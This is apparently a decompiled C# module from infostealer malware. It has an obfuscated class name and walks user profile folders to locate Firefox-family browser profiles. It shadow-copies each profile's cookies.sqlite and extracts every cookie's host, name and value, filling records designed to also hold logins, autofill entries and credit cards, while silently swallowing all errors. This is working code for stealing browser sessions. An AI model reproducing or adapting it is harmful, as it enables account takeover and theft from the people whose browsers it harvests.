// g_E_c_к_0
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;

public static class g_E_c_к_0
{
	public static List<Browser> TryFind(IList<string> paths)
	{
		List<Browser> list = new List<Browser>();
		try
		{
			foreach (string item in paths.Select((string x) => Environment.ExpandEnvironmentVariables(x)))
			{
				try
				{
					foreach (string item2 in FileCopier.FindPaths(item, 2, 1, "cookies.sqlite"))
					{
						string fullName = new FileInfo(item2).Directory.FullName;
						string text = (item2.Contains(Environment.ExpandEnvironmentVariables("%USERPROFILE%\\AppData\\Roaming")) ? GeckoRoamingName(fullName) : GeckoLocalName(fullName));
						if (!string.IsNullOrEmpty(text))
						{
							Browser browser = new Browser
							{
								BrowserName = text,
								BrowserProfile = new DirectoryInfo(fullName).Name,
								Cookies = new List<ScannedCookie>(EnumCook(fullName)),
								Logins = new List<Account>(),
								Autofills = new List<Autofill>(),
								CC = new List<CC>()
							};
							if (!browser.IsEmpty())
							{
								list.Add(browser);
							}
						}
					}
				}
				catch
				{
				}
			}
			return list;
		}
		catch (Exception)
		{
			return list;
		}
	}

	private static List<ScannedCookie> EnumCook(string profile)
	{
		List<ScannedCookie> list = new List<ScannedCookie>();
		try
		{
			string text = Path.Combine(profile, "cookies.sqlite");
			if (!File.Exists(text))
			{
				return list;
			}
			using FileCopier fileCopier = new FileCopier();
			DbFactory dbFactory = new DbFactory(fileCopier.CreateShadowCopy(text));
			dbFactory.ReadContextTable("moz_cookies");
			for (int i = 0; i < dbFactory.RowLength; i++)
			{
				ScannedCookie scannedCookie = null;
				try
				{
					ScannedCookie scannedCookie2 = new ScannedCookie();
					scannedCookie2.Host = dbFactory.GatherValue(i, "host").Trim();
					scannedCookie2.Http = dbFactory.GatherValue(i, "host").Trim()[0] == '.';
					scannedCookie2.Path = dbFactory.GatherValue(i, "path").Trim();
					scannedCookie2.Secure = dbFactory.GatherValue(i, "isSecure")[0] == '1';
					scannedCookie2.Expires = Convert.ToInt64(dbFactory.GatherValue(i, "expiry").Trim());
					scannedCookie2.Name = dbFactory.GatherValue(i, "name").Trim();
					scannedCookie2.Value = dbFactory.GatherValue(i, "value");
					scannedCookie = scannedCookie2;
				}
				catch
				{
				}
				if (scannedCookie != null)
				{
					list.Add(scannedCookie);
				}
			}
			return list;
		}
		catch
		{
			return list;
		}
	}

	public static string GeckoRoamingName(string profilesDirectory)
	{
		string result = string.Empty;
		try
		{
			profilesDirectory = profilesDirectory.Replace(Environment.ExpandEnvironmentVariables("%appdata%\\"), string.Empty);
			string[] array = profilesDirectory.Split(new char[1] { '\\' }, StringSplitOptions.RemoveEmptyEntries);
			if (array[2] == "Profiles")
			{
				result = array[1];
				return result;
			}
			result = array[0];
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static string GeckoLocalName(string profilesDirectory)
	{
		string result = string.Empty;
		try
		{
			profilesDirectory = profilesDirectory.Replace(Environment.ExpandEnvironmentVariables("%localappdata%\\"), string.Empty);
			string[] array = profilesDirectory.Split(new char[1] { '\\' }, StringSplitOptions.RemoveEmptyEntries);
			if (array[2] == "Profiles")
			{
				result = array[1];
				return result;
			}
			result = array[0];
			return result;
		}
		catch
		{
			return result;
		}
	}
}
